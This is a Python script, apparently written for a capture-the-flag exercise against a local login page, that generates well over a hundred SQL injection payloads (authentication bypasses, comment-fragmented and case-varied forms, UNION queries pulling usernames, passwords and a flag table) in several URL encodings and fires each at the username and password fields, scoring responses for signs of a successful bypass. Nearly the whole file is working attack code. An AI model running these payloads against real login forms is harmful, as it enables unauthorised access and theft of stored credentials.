import requests
import urllib.parse
import time
import re
from typing import Dict, List, Tuple

def encode_payload(payload: str, method: str) -> str:
    """Apply encoding to payload based on method"""
    if method == 'none':
        return payload
    elif method == 'url':
        return urllib.parse.quote(payload, safe='')
    elif method == 'url_plus':
        return urllib.parse.quote_plus(payload, safe='')
    elif method == 'double_url':
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    else:
        return payload

def generate_payloads() -> List[Dict[str, str]]:
    """Generate comprehensive SQL injection payloads with metadata"""
    payloads = []
    
    # Classic auth bypass payloads
    classic = [
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin'or 1=1--",
        "admin'or 1=1#",
        "admin'or 1=1/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "' or '1'='1--",
        "' or '1'='1#",
        "' or '1'='1/*",
    ]
    
    # Case variations
    case_variations = [
        "AdMiN'--",
        "aDmIn' #",
        "' OR '1'='1",
        "' oR '1'='1",
        "admin' Or '1'='1",
        "' AnD '1'='1",
    ]
    
    # URL encoding variations (will apply encoding later)
    url_encoded_base = [
        "admin'--",
        "admin' #",
        "' OR '1'='1",
        "' or 1=1--",
        "admin' or '1'='1",
    ]
    
    # Fragmentation with comments
    fragmentation = [
        "ad/**/min'--",
        "ad/**/min' #",
        "'/**/OR/**/'1'='1",
        "admin'/**/or/**/'1'='1",
        "'/*or*/OR/*'*/1=1--",
    ]
    
    # Alternative comments
    comment_variations = [
        "admin';",
        "admin';--",
        "admin';#",
        "admin';/*",
        "admin';%00",
        "admin'-- -",
        "admin'--+",
    ]
    
    # Double quote variations
    double_quote = [
        '"admin"--',
        '"admin" #',
        '"admin"/*',
        '" or ""="',
        '" or 1=1--',
    ]
    
    # UNION-based for data extraction
    union_payloads = [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,username,password FROM users--",
        "' UNION SELECT 1,flag,3 FROM flag--",
        "admin' UNION SELECT 1,2,3--",
    ]
    
    # Logic variations with different truth conditions
    logic_variations = [
        "admin' OR 1=1--",
        "admin' OR 1#",
        "admin' OR 1/*",
        "' OR 'a'='a'--",
        "' OR 1=1#",
        "' OR 1/*",
        "' OR 1=1--",
        "' OR 1=1-- -",
    ]
    
    # Parenthesis bypass
    parenthesis = [
        "admin')--",
        "admin') #",
        "admin') or ('1'='1",
        "') or '1'='1--",
        "') or ('1'='1--",
    ]
    
    # Backtick variations (for column/table names)
    backtick = [
        "`admin`--",
        "`admin` #",
        "`admin`/*",
    ]
    
    # Number alternative for '1'
    number_alt = [
        "admin' OR 2>1--",
        "admin' OR 2>1#",
        "admin' OR 2>1/*",
        "' OR 2>1--",
    ]
    
    # All categories combined
    all_base_payloads = (
        classic + case_variations + fragmentation + 
        comment_variations + double_quote + union_payloads + 
        logic_variations + parenthesis + backtick + number_alt
    )
    
    # Generate encoding variants
    encoding_methods = ['none', 'url', 'url_plus', 'double_url']
    
    for base_payload in all_base_payloads:
        for encoding in encoding_methods:
            encoded_payload = encode_payload(base_payload, encoding)
            payloads.append({
                'payload': encoded_payload,
                'encoding': encoding,
                'raw_payload': base_payload
            })
    
    return payloads

def test_login_payloads(target_url: str, payloads: List[Dict[str, str]]):
    """Test payloads against login form"""
    results = []
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    for i, payload_info in enumerate(payloads):
        payload = payload_info['payload']
        encoding = payload_info['encoding']
        raw_payload = payload_info['raw_payload']
        
        # Test in username field
        try:
            data_username = f"username={payload}&password=dummypass123"
            response_u = requests.post(
                target_url,
                headers=headers,
                data=data_username,
                timeout=10,
                allow_redirects=False
            )
            
            success_indicators = {
                'status_code': response_u.status_code,
                'content_length': len(response_u.content),
                'has_admin': 'admin' in response_u.text.lower(),
                'has_flag': 'flag' in response_u.text.lower(),
                'has_welcome': 'welcome' in response_u.text.lower(),
                'has_dashboard': 'dashboard' in response_u.text.lower(),
                'has_logout': 'logout' in response_u.text.lower(),
                'location_header': response_u.headers.get('Location', ''),
                'set_cookie': bool(response_u.cookies)
            }
            
            results.append({
                'test_num': i,
                'field': 'username',
                'payload': payload,
                'raw_payload': raw_payload,
                'encoding': encoding,
                **success_indicators
            })
            
            # Print interesting results
            if (response_u.status_code != 200 or 
                success_indicators['has_admin'] or 
                success_indicators['has_flag'] or 
                success_indicators['has_welcome'] or
                success_indicators['has_dashboard'] or
                success_indicators['has_logout'] or
                success_indicators['set_cookie']):
                
                print(f"\n[ANOMALY {i}] Username field - Status: {response_u.status_code}")
                print(f"Payload (raw): {raw_payload}")
                print(f"Encoding: {encoding}")
                print(f"Payload (encoded): {payload[:100]}")
                print(f"Indicators: {success_indicators}")
                if len(response_u.text) < 500:
                    print(f"Response snippet: {response_u.text[:300]}")
            
        except requests.exceptions.RequestException as e:
            print(f"\n[ERROR {i}] Username field - Connection error: {str(e)}")
            results.append({
                'test_num': i,
                'field': 'username',
                'payload': payload,
                'raw_payload': raw_payload,
                'encoding': encoding,
                'error': str(e)
            })
        
        # Test in password field
        try:
            data_password = f"username=dummyuser123&password={payload}"
            response_p = requests.post(
                target_url,
                headers=headers,
                data=data_password,
                timeout=10,
                allow_redirects=False
            )
            
            success_indicators = {
                'status_code': response_p.status_code,
                'content_length': len(response_p.content),
                'has_admin': 'admin' in response_p.text.lower(),
                'has_flag': 'flag' in response_p.text.lower(),
                'has_welcome': 'welcome' in response_p.text.lower(),
                'has_dashboard': 'dashboard' in response_p.text.lower(),
                'has_logout': 'logout' in response_p.text.lower(),
                'location_header': response_p.headers.get('Location', ''),
                'set_cookie': bool(response_p.cookies)
            }
            
            results.append({
                'test_num': i,
                'field': 'password',
                'payload': payload,
                'raw_payload': raw_payload,
                'encoding': encoding,
                **success_indicators
            })
            
            # Print interesting results
            if (response_p.status_code != 200 or 
                success_indicators['has_admin'] or 
                success_indicators['has_flag'] or 
                success_indicators['has_welcome'] or
                success_indicators['has_dashboard'] or
                success_indicators['has_logout'] or
                success_indicators['set_cookie']):
                
                print(f"\n[ANOMALY {i}] Password field - Status: {response_p.status_code}")
                print(f"Payload (raw): {raw_payload}")
                print(f"Encoding: {encoding}")
                print(f"Payload (encoded): {payload[:100]}")
                print(f"Indicators: {success_indicators}")
                if len(response_p.text) < 500:
                    print(f"Response snippet: {response_p.text[:300]}")
            
        except requests.exceptions.RequestException as e:
            print(f"\n[ERROR {i}] Password field - Connection error: {str(e)}")
            results.append({
                'test_num': i,
                'field': 'password',
                'payload': payload,
                'raw_payload': raw_payload,
                'encoding': encoding,
                'error': str(e)
            })
        
        # Rate limiting - small delay
        time.sleep(0.1)
    
    return results

def analyze_results(results: List[Dict]):
    """Analyze test results for patterns"""
    print("\n" + "="*80)
    print("SQL INJECTION BYPASS TEST RESULTS")
    print("="*80)
    
    # Count anomalies
    anomalies = [r for r in results if not r.get('error') and (
        r['status_code'] != 200 or 
        r['has_admin'] or 
        r['has_flag'] or 
        r['has_welcome'] or
        r['has_dashboard'] or
        r['has_logout'] or
        r['set_cookie']
    )]
    
    errors = [r for r in results if r.get('error')]
    
    print(f"\nTotal tests: {len(results)}")
    print(f"Anomalies found: {len(anomalies)}")
    print(f"Errors: {len(errors)}")
    
    # Summary of anomalies
    if anomalies:
        print("\n[TOP ANOMALIES] (status != 200 or success indicators)")
        for idx, anomaly in enumerate(anomalies[:20], 1):  # Top 20
            print(f"\n{idx}. Test #{anomaly['test_num']} - {anomaly['field'].upper()} field")
            print(f"   Status: {anomaly['status_code']}")
            print(f"   Length: {anomaly['content_length']}B")
            print(f"   Raw payload: {anomaly['raw_payload']}")
            print(f"   Encoding: {anomaly['encoding']}")
            print(f"   Indicators: admin={anomaly['has_admin']}, flag={anomaly['has_flag']}, "
                  f"welcome={anomaly['has_welcome']}, dashboard={anomaly['has_dashboard']}, "
                  f"logout={anomaly['has_logout']}, cookie={anomaly['set_cookie']}")
            if anomaly['location_header']:
                print(f"   Redirect: {anomaly['location_header']}")
    
    # Look for flags in all responses
    flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)
    flags_found = []
    
    for result in results:
        if not result.get('error'):
            # This would require storing response text, but for efficiency,
            # we just flag that we saw indicators during testing
            pass
    
    print(f"\n{'='*80}")
    
    return anomalies

def main():
    target_url = "http://127.0.0.1:33148/login"
    
    print("Generating SQL injection bypass payloads...")
    payloads = generate_payloads()
    print(f"Generated {len(payloads)} payloads with encoding variants")
    
    print(f"\nTesting payloads against {target_url}")
    print("This may take several minutes...")
    
    results = test_login_payloads(target_url, payloads)
    
    anomalies = analyze_results(results)
    
    # Quick summary
    print(f"\n[SUMMARY]")
    print(f"Tested {len(results)} payload combinations")
    print(f"Found {len(anomalies)} anomalous responses")
    
    return results

if __name__ == "__main__":
    main()

